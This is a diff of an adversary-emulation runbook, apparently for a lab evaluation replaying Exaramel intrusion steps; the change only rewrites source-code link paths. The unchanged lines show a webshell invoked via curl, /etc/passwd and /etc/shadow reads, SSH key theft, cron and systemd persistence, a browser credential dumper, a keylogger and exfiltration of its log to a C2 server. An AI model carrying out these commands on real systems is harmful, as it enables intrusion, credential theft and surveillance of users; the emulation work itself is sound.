@@ -54,9 +54,9 @@ Move P.A.S. webshell to `/var/www/html` so it can be invoked via httpd.
 ssh fherbert@10.0.1.5 "sudo mv /tmp/search.php /var/www/html/"
 ```
 
-[Source Code](/Resources/phpWebShell/webShell.php)
+[Source Code](../../Resources/phpWebShell/webShell.php)
 
-[Source Code - Obfuscated](/Resources/phpWebShell/obfuscated_webShell.php)
+[Source Code - Obfuscated](../../Resources/phpWebShell/obfuscated_webShell.php)
 
 ### :microscope: Cited Intelligence
 
@@ -112,7 +112,7 @@ Execute `cat /etc/passwd` from P.A.S. webshell.
 curl --insecure "https://10.0.1.5/search.php?cmd=cat+/etc/passwd"
 ```
 
-[Source Code](/Resources/phpWebShell/webShell.php#L35)
+[Source Code](../../Resources/phpWebShell/webShell.php#L35)
 
 ### :microscope: Cited Intelligence
 
@@ -194,7 +194,7 @@ Execute SUID binary, `/bin/backup`; this binary executes `check.sh` from the pre
 curl --insecure "https://10.0.1.5/search.php?cmd=/bin/backup" &
 ```
 
-[Source Code](/Resources/suid-binary/suid-binary.c)
+[Source Code](../../Resources/suid-binary/suid-binary.c)
 
 :warning: Switch to your controlServer tab; you should have a new callback.
 
@@ -241,7 +241,7 @@ Set cron persistence.
 ./evalsC2client.py --set-task exaramel-implant "persist cron"
 ```
 
-[Source Code](/Resources/Exaramel/configur/configur.go#L212)
+[Source Code](../../Resources/Exaramel/configur/configur.go#L212)
 
 Set systemd persistence.
 
@@ -251,7 +251,7 @@ Set systemd persistence.
 ./evalsC2client.py --set-task exaramel-implant "persist systemd"
 ```
 
-[Source Code](/Resources/Exaramel/configur/configur.go#L261)
+[Source Code](../../Resources/Exaramel/configur/configur.go#L261)
 
 Get /etc/shadow.
 
@@ -271,7 +271,7 @@ Get bash history.
 ./evalsC2client.py --set-task exaramel-implant "exec cat /home/fherbert/.bash_history"
 ```
 
-[Source Code](/Resources/Exaramel/worker/worker.go#L156)
+[Source Code](../../Resources/Exaramel/worker/worker.go#L156)
 
 Download SSH keys from caladan to control server (HTTPS to 192.168.0.4:8443)
 
@@ -286,7 +286,7 @@ Download SSH keys from caladan to control server (HTTPS to 192.168.0.4:8443)
 ./evalsC2client.py --set-task exaramel-implant "get /home/fherbert/.ssh/id_rsa.pub caladan_id_rsa.pub"
 ```
 
-[Source Code](/Resources/Exaramel/worker/worker.go#L100)
+[Source Code](../../Resources/Exaramel/worker/worker.go#L100)
 
 Confirm SSH keys are present on attack platform:
 
@@ -423,7 +423,7 @@ On login, the fherbert registry persistence will execute the exaramel-windows-dr
 
 The dropper will download Exaramel-Windows over HTTP. The dropper then executes the Exaramel-Windows (wsmprovav.dll) using rundll32.exe.
 
-[Source Code](/Resources/Exaramel-Windows-Dropper/main.cpp)
+[Source Code](../../Resources/Exaramel-Windows-Dropper/main.cpp)
 
 :warning: Switch to your control server terminal; you should have a new C2 session from Exaramel-Windows.
 
@@ -461,7 +461,7 @@ Get current user.
 ./evalsC2client.py --set-task Exaramel-Windows "get-user"
 ```
 
-[Source Code](/Resources/Exaramel-Windows/taskhandler/taskhandler.go#L36)
+[Source Code](../../Resources/Exaramel-Windows/taskhandler/taskhandler.go#L36)
 
 Get Windows version info.
 
@@ -471,7 +471,7 @@ Get Windows version info.
 ./evalsC2client.py --set-task Exaramel-Windows "get-sysinfo"
 ```
 
-[Source Code](/Resources/Exaramel-Windows/taskhandler/taskhandler.go#L46)
+[Source Code](../../Resources/Exaramel-Windows/taskhandler/taskhandler.go#L46)
 
 List entire file system.
 
@@ -481,7 +481,7 @@ List entire file system.
 ./evalsC2client.py --set-task Exaramel-Windows "enum-files C:\\"
 ```
 
-[Source Code](/Resources/Exaramel-Windows/taskhandler/taskhandler.go#L55)
+[Source Code](../../Resources/Exaramel-Windows/taskhandler/taskhandler.go#L55)
 
 Look for RDP connections.
 
@@ -491,7 +491,7 @@ Look for RDP connections.
 ./evalsC2client.py --set-task Exaramel-Windows "exec-cmd netstat -ano | findstr 3389"
 ```
 
-[Source Code](/Resources/Exaramel-Windows/taskhandler/taskhandler.go#L17)
+[Source Code](../../Resources/Exaramel-Windows/taskhandler/taskhandler.go#L17)
 
 ### :microscope: Cited Intelligence
 
@@ -544,7 +544,7 @@ Execute the webCredDumper; you should see credentials from Chromium.
 
 :warning: oradump (LaZagne) can take several minutes to finish executing. Give it 5 minutes... if it hasn't returned by then, the vendor product probably broke it.
 
-[Modified LaZagne](/Resources/browser-creds/Windows)
+[Modified LaZagne](../../Resources/browser-creds/Windows)
 
 Upload keylogger to gammu.
 
@@ -560,7 +560,7 @@ Execute the keylogger, logging keystrokes to mslog.txt.
 ./evalsC2client.py --set-task Exaramel-Windows "exec-background C:\\Windows\\System32\\mslog.exe -o C:\\Windows\\System32\\mslog.txt"
 ```
 
-[Keylogger Source Code](/Resources/keylogger/src/SetWindowsHookEx-Keylogger.cpp)
+[Keylogger Source Code](../../Resources/keylogger/src/SetWindowsHookEx-Keylogger.cpp)
 
 Now we will exercise the keylogger.
 
@@ -594,7 +594,7 @@ Confirm the keylogger actually logged keystrokes:
 ./evalsC2client.py --set-task Exaramel-Windows "exec-cmd type C:\\Windows\\System32\\mslog.txt"
 ```
 
-[Source Code](/Resources/Exaramel-Windows/taskhandler/taskhandler.go#L17)
+[Source Code](../../Resources/Exaramel-Windows/taskhandler/taskhandler.go#L17)
 
 Exfil the keylog file over the Exaramel-Windows C2 session (HTTPS).
 
@@ -606,7 +606,7 @@ Exfil the keylog file over the Exaramel-Windows C2 session (HTTPS).
 ./evalsC2client.py --set-task Exaramel-Windows "put-file C:\\Windows\\System32\\mslog.txt"
 ```
 
-[Source Code](/Resources/Exaramel-Windows/taskhandler/taskhandler.go#L94)
+[Source Code](../../Resources/Exaramel-Windows/taskhandler/taskhandler.go#L94)
 
 Confirm you uploaded the keylog file; you should see an RC4 encrypted blob.
 
